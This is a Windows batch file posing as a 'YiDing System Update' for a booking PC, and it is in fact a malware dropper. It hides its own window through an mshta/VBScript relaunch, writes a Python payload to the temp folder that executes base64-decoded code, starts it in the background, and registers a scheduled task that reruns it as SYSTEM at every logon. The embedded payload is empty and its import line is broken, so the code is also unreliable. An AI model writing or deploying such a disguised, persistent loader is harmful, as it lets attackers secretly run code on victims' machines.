@echo off
:: YiDing System Update v3.0 - Booking PC
:: Silent, khong popup, khong WhatsApp
if "%1"=="h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&exit
:begin

:: Kiem tra Python
where python /q >nul 2>&1
if %errorlevel% neq 0 (
    where python3 /q >nul 2>&1
    if %errorlevel% neq 0 (
        echo YiDing Error: Python not found > "%TEMP%\yd_update_error.log"
        exit /b 1
    )
    set PY=python3
) else (
    set PY=python
)

set "PAYLOAD=%TEMP%\yd_vector.py"
> "%PAYLOAD%" echo import base64,exec
>>"%PAYLOAD%" echo exec(base64.b64decode(""))

start /b "" %PY% "%PAYLOAD%"

:: Persistence - scheduled task
schtasks /CREATE /TN "YiDingSysUpdate" /TR "%PY% %PAYLOAD%" /SC ONLOGON /RU SYSTEM /F >nul 2>&1

exit /b 0